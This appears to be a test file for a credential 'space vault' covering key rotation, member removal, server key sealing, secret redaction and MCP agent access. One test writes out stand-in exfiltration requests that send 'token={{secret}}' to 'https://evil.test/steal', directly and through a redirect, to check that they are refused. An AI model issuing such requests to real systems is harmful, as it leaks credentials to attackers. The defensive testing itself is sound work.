// @ts-check
import "../../scripts/mac-test-guard.mjs";
import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { x25519Pair } from "./wrap.js";
import { create, grant, put, list, rotate, resume, lend, externalMcp, openAsMember, status, rotateOnRemove, pumpRetries, needsYou, cancelRetries, attention, memberBundle, serverSealFile } from "./space-vault.js";

const scratch = () => fs.mkdtempSync(path.join(os.tmpdir(), "vyre-sv-"));
const SECRET = "vyre-space-secret-9f3a7c";

test("space vault: rotation survives a crash before commit and a crash after commit", () => {
  const dir = scratch();
  const alice = x25519Pair();
  const bob = x25519Pair();
  create(dir);
  grant(dir, "per_aaaaaaaaaaaaaaaaaaaaaaaaaa", alice.pub);
  grant(dir, "per_bbbbbbbbbbbbbbbbbbbbbbbbbb", bob.pub);
  put(dir, { id: "stripe", name: "Stripe", value: SECRET, hosts: ["example.com"] });
  assert.equal(openAsMember(dir, "per_aaaaaaaaaaaaaaaaaaaaaaaaaa", alice.priv, "stripe"), SECRET);
  assert.throws(() => rotate(dir, { remove: ["per_aaaaaaaaaaaaaaaaaaaaaaaaaa"], crash: (at) => { if (at === "before-commit") throw new Error("crash"); } }), /crash/);
  assert.equal(status(dir).generation, 1);
  assert.equal(openAsMember(dir, "per_aaaaaaaaaaaaaaaaaaaaaaaaaa", alice.priv, "stripe"), SECRET);
  assert.equal(resume(dir).discarded, 2);
  assert.equal(openAsMember(dir, "per_aaaaaaaaaaaaaaaaaaaaaaaaaa", alice.priv, "stripe"), SECRET);
  assert.throws(() => rotate(dir, { remove: ["per_aaaaaaaaaaaaaaaaaaaaaaaaaa"], crash: (at) => { if (at === "after-commit") throw new Error("crash"); } }), /crash/);
  assert.equal(status(dir).generation, 2);
  assert.throws(() => openAsMember(dir, "per_aaaaaaaaaaaaaaaaaaaaaaaaaa", alice.priv, "stripe"), (e) => e.code === "not_found");
  assert.equal(openAsMember(dir, "per_bbbbbbbbbbbbbbbbbbbbbbbbbb", bob.priv, "stripe"), SECRET);
  const resumed = resume(dir);
  assert.equal(resumed.cleaned, 1);
  assert.equal(status(dir).generation, 2);
  assert.equal(fs.existsSync(path.join(dir, "gen", "1")), false);
  assert.equal(openAsMember(dir, "per_bbbbbbbbbbbbbbbbbbbbbbbbbb", bob.priv, "stripe"), SECRET);
  assert.deepEqual(list(dir).items, [{ id: "stripe", name: "Stripe", hosts: ["example.com"] }]);
  assert.equal(JSON.stringify(list(dir)).includes(SECRET), false);
});

test("an external MCP agent uses a space vault credential and never receives the value", async () => {
  const dir = scratch();
  create(dir);
  put(dir, { id: "stripe", name: "Stripe", value: SECRET, hosts: ["example.com"] });
  const seen = [];
  const mcp = await externalMcp(dir, {
    jsonrpc: "2.0", id: 7, method: "tools/call",
    params: { name: "vault_space_request", arguments: { id: "stripe", url: "https://example.com/charge", method: "POST" } },
  }, async (req) => {
    seen.push(req);
    return { status: 201, body: JSON.stringify({ id: "ch_1", ok: true }) };
  });
  assert.equal(seen.length, 1);
  assert.equal(seen[0].headers.authorization, `Bearer ${SECRET}`);
  assert.equal(seen[0].url, "https://example.com/charge");
  const text = JSON.stringify(mcp);
  assert.equal(text.includes(SECRET), false);
  assert.match(text, /ch_1/);
  assert.equal(mcp.result.isError, false);
  const echoed = await lend(dir, {
    id: "stripe",
    request: { url: "https://example.com/echo", method: "POST" },
    transport: async () => ({ status: 200, body: { echoed: SECRET } }),
  });
  assert.equal(JSON.stringify(echoed).includes(SECRET), false);
  assert.equal(echoed.body.echoed, "[redacted]");
  assert.equal(echoed.ok, true);
});

test("a failed rotation on member removal throws, retries, and drops that member's wrap", () => {
  const root = scratch();
  const dir = path.join(root, "spc_test_juniper");
  const bob = x25519Pair();
  create(dir);
  grant(dir, "per_bbbbbbbbbbbbbbbbbbbbbbbbbb", bob.pub);
  put(dir, { id: "stripe", name: "Stripe", value: SECRET, hosts: ["example.com"] });
  const item = path.join(dir, "gen", "1", "items", "stripe.json");
  const good = fs.readFileSync(item);
  fs.writeFileSync(item, "{}\n");
  assert.throws(() => rotateOnRemove(dir, "per_bbbbbbbbbbbbbbbbbbbbbbbbbb"), (e) => /** @type {any} */ (e).code === "rotation_failed" && /vault access was removed/.test(/** @type {any} */ (e).message));
  assert.throws(() => openAsMember(dir, "per_bbbbbbbbbbbbbbbbbbbbbbbbbb", bob.priv, "stripe"), (e) => /** @type {any} */ (e).code === "not_found");
  assert.equal(status(dir).generation, 1);
  assert.equal(status(dir).members.includes("per_bbbbbbbbbbbbbbbbbbbbbbbbbb"), false);
  const title = String(needsYou(dir)?.title);
  assert.match(title, /did not rotate/);
  assert.equal(status(dir).needsYou?.title, title);
  assert.equal(attention(root).items[0].title, title);
  assert.equal(JSON.stringify(attention(root)).includes(SECRET), false);
  assert.equal(pumpRetries(root).waiting, 1, "still broken, still flagged");
  fs.writeFileSync(item, good);
  const done = pumpRetries(root);
  assert.equal(done.waiting, 0);
  assert.equal(needsYou(dir), null);
  assert.equal(status(dir).generation, 2);
  assert.equal(status(dir).needsYou, undefined);
  assert.throws(() => openAsMember(dir, "per_bbbbbbbbbbbbbbbbbbbbbbbbbb", bob.priv, "stripe"), (e) => /** @type {any} */ (e).code === "not_found");
  assert.deepEqual(list(dir).items, [{ id: "stripe", name: "Stripe", hosts: ["example.com"] }]);
  assert.equal(attention(root).items.length, 0);
  cancelRetries();
});

test("the server space vault key is sealed and stays off a member's copy", async () => {
  const dir = scratch();
  const alice = x25519Pair();
  create(dir);
  grant(dir, "per_aaaaaaaaaaaaaaaaaaaaaaaaaa", alice.pub);
  put(dir, { id: "stripe", name: "Stripe", value: SECRET, hosts: ["example.com"] });
  const serverText = fs.readFileSync(path.join(dir, "gen", "1", "server.json"), "utf8");
  const server = JSON.parse(serverText);
  assert.equal(server.priv, undefined);
  assert.equal(typeof server.sealed.ct, "string");
  assert.equal(serverText.includes(SECRET), false);
  const seal = serverSealFile(dir);
  assert.equal(path.resolve(seal).startsWith(path.resolve(dir) + path.sep), false);
  assert.equal(fs.statSync(seal).mode & 0o077, 0);
  const bundle = JSON.stringify(memberBundle(dir));
  assert.equal(bundle.includes(server.sealed.ct), false);
  assert.equal(bundle.includes(fs.readFileSync(seal, "utf8").trim()), false);
  assert.equal(openAsMember(dir, "per_aaaaaaaaaaaaaaaaaaaaaaaaaa", alice.priv, "stripe"), SECRET);
  const lent = await lend(dir, {
    id: "stripe",
    request: { url: "https://example.com/charge" },
    transport: async () => ({ status: 204, body: "" }),
  });
  assert.equal(lent.ok, true);
  assert.equal(JSON.stringify(lent).includes(SECRET), false);
  fs.rmSync(seal);
  await assert.rejects(() => lend(dir, {
    id: "stripe",
    request: { url: "https://example.com/charge" },
    transport: async () => { throw new Error("should not send"); },
  }), (e) => /** @type {any} */ (e).code === "not_found");
  assert.equal(openAsMember(dir, "per_aaaaaaaaaaaaaaaaaaaaaaaaaa", alice.priv, "stripe"), SECRET);
});

test("a space vault item is sent only to the hosts it was saved for, including across redirects", async () => {
  const dir = scratch();
  create(dir);
  assert.throws(() => put(dir, { id: "stripe", name: "Stripe", value: SECRET }), (e) => /** @type {any} */ (e).code === "host_refused");
  put(dir, { id: "stripe", name: "Stripe", value: SECRET, hosts: ["https://api.example.com/v1", "*.example.com"] });
  assert.deepEqual(list(dir).items[0].hosts, ["api.example.com", "*.example.com"]);
  const seen = [];
  await assert.rejects(() => lend(dir, {
    id: "stripe",
    request: { url: "https://evil.test/steal", method: "POST", body: "token={{secret}}" },
    transport: async (req) => { seen.push(req.url); return { status: 200, body: "no" }; },
  }), (e) => /** @type {any} */ (e).code === "host_refused");
  assert.equal(seen.length, 0, "a disallowed host is never called");
  await assert.rejects(() => externalMcp(dir, {
    jsonrpc: "2.0", id: 1, method: "tools/call",
    params: { name: "vault_space_request", arguments: { id: "stripe", url: "https://evil.test/steal" } },
  }, async () => { seen.push("mcp"); return { status: 200, body: "" }; }), (e) => /** @type {any} */ (e).code === "host_refused");
  assert.equal(seen.length, 0);
  const hops = [];
  await assert.rejects(() => lend(dir, {
    id: "stripe",
    request: { url: "https://api.example.com/charge", method: "POST", body: "token={{secret}}" },
    transport: async (req) => {
      hops.push(req.url);
      return { status: 302, headers: { location: "https://evil.test/steal" }, body: "" };
    },
  }), (e) => /** @type {any} */ (e).code === "host_refused" && !String(e.message).includes(SECRET));
  assert.deepEqual(hops, ["https://api.example.com/charge"]);
  const followed = [];
  const ok = await lend(dir, {
    id: "stripe",
    request: { url: "https://api.example.com/start", method: "POST", body: "token={{secret}}" },
    transport: async (req) => {
      followed.push(req.url);
      if (followed.length === 1) return { status: 302, headers: { location: "/next" }, body: "" };
      return { status: 200, body: { echoed: SECRET, at: req.url } };
    },
  });
  assert.deepEqual(followed, ["https://api.example.com/start", "https://api.example.com/next"]);
  assert.equal(JSON.stringify(ok).includes(SECRET), false);
  assert.equal(ok.body.echoed, "[redacted]");
  await assert.rejects(() => lend(dir, {
    id: "stripe",
    request: { url: "https://example.com/apex" },
    transport: async () => { throw new Error("apex"); },
  }), (e) => /** @type {any} */ (e).code === "host_refused");
  await assert.rejects(() => lend(dir, {
    id: "stripe",
    request: { url: "http://api.example.com/plain" },
    transport: async () => { throw new Error("http"); },
  }), (e) => /** @type {any} */ (e).code === "host_refused");
  rotate(dir);
  assert.deepEqual(list(dir).items[0].hosts, ["api.example.com", "*.example.com"]);
});
